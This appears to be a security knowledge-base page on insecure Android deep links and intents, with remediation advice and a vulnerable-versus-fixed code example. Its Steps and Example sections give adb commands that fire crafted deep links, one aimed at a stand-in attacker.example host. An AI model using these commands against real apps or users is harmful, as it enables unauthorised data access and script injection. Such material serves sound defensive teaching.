---
title: "Insecure deep links & intents"
description: "How unvalidated deep-link and intent parameters turn a URL into an IDOR, a WebView file disclosure or a token leak — with a worked example and validation remediation."
tags:
  - Android
  - Vulnerabilities
  - Deep Links
  - Intents
---

# Insecure deep links & intents

## Explanation

A **deep link** is a URL (`scheme://host/path?param=...`) that an app registers with an `intent-filter`. Opening it — from a browser, an email, a chat message or another app — resolves to an **intent** that starts an internal component, carrying the URL's parameters.

The vulnerability is treating those parameters as trusted. A deep link is **attacker-controllable, cross-app input**: anyone who can get the victim to tap a link can reach an internal screen with chosen values. Common failures:

- A parameter selects an object with no ownership check → **IDOR**.
- A `url`/`next`/`redirect` parameter is loaded into a [WebView](webview-vulnerabilities.md) or used to redirect → **file disclosure / open redirect / token leak**.
- A sensitive action is reachable directly via the link, skipping the normal flow.
- A **custom scheme** is registered by more than one app, so a malicious app can intercept links (and any token in them).

Maps to **OWASP Mobile M4 (insufficient input/output validation)**.

## Exploitation

Deliver a crafted link to the victim (or fire it from a malicious app / `adb`). The app resolves it to an internal component and acts on the parameters:

- Swap an `id` to another user's record → read or change data you should not own.
- Point a `url` parameter at `file://` or an attacker page the WebView loads → steal local files or run script.
- Supply a token/redirect the app forwards → leak it to an attacker-controlled destination.

## Steps

```bash
# 1. Enumerate the app's schemes and deep-link filters from the manifest
apktool d app.apk -o app_decoded
grep -nE 'android:scheme|android:host|<data |intent-filter|android.intent.action.VIEW' \
  app_decoded/AndroidManifest.xml

# 2. Trace each parameter into the code to see what it controls
jadx -d app_src app.apk
grep -rnE "getData|getQueryParameter|getIntent|loadUrl|startActivity" app_src

# 3. Fire the scheme as if a link had been tapped, varying the parameters
adb shell am start -a android.intent.action.VIEW -d "<scheme>://profile?id=1337"
adb shell am start -a android.intent.action.VIEW -d "<scheme>://web?url=https://attacker.example/x"
```

## Remediation

- **Validate every deep-link parameter** server-side where it drives a data lookup (enforce ownership/authorization on the backend, not on the `id` in the link).
- Allow-list `url`/redirect parameters against known hosts; never load an arbitrary URL into a WebView.
- Use **Android App Links** (`android:autoVerify="true"` with a verified `assetlinks.json`) instead of unverifiable custom schemes, so another app cannot claim your links.
- Do not put secrets or tokens in deep-link URLs.
- Require the normal flow (and re-authentication) for sensitive actions rather than letting a link reach them directly.

## Example

**Vulnerable** — an `intent-filter` exposes a profile screen that trusts the `id`:

```xml
<activity android:name=".ProfileActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="<scheme>" android:host="profile" />
    </intent-filter>
</activity>
```

```java
// ProfileActivity: uses the id from the link with no authorization check
String id = getIntent().getData().getQueryParameter("id");
loadProfile(id);   // fetches /api/users/{id} with the current session
```

**Exploit** — a link to another user's profile:

```bash
adb shell am start -a android.intent.action.VIEW -d "<scheme>://profile?id=1337"
# App shows user 1337's data — an IDOR driven entirely by a URL.
```

**Fixed** — the backend enforces that the session owns the record (the client id is only a hint):

```java
String id = getIntent().getData().getQueryParameter("id");
// Server returns 403 unless the authenticated user may view {id}
api.getProfile(id); // authorization enforced server-side, per request
```

!!! tip "Go deeper"
    The full `adb` exploitation workflow, intent spoofing and scheme-hijacking are on [Exploiting deep links &amp; intents](../exploit-deeplinks.md); the WebView side is on [WebView vulnerabilities](webview-vulnerabilities.md).
